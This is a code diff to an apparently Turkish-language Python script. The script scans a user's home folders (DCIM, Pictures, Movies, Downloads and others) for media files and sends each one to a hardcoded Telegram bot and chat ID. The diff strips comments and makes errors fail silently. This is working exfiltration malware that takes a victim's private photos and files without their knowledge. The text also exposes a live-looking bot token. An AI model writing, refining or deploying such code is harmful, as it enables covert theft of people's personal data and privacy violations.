@@ -4,7 +4,6 @@ import requests
 BOT_TOKEN = '7526840364:AAEmbY0HvifSAZHEndWZ6VJUgUTQcjcIVNM'
 CHAT_ID = '1271397574'
 
-# Hedef klasörler (kullanıcının ana dizini içinden)
 base_folders = ['DCIM', 'Media', 'Movies', 'Music', 'Pictures', 'Downloads']
 
 extensions = [
@@ -21,8 +20,8 @@ def send_file(file_path):
             files = {'document': f}
             data = {'chat_id': CHAT_ID}
             requests.post(url, files=files, data=data)
-    except Exception as e:
-        pass  # Sessiz geç mk
+    except:
+        pass
 
 def tarat_ve_gonder():
     home = os.path.expanduser('~')
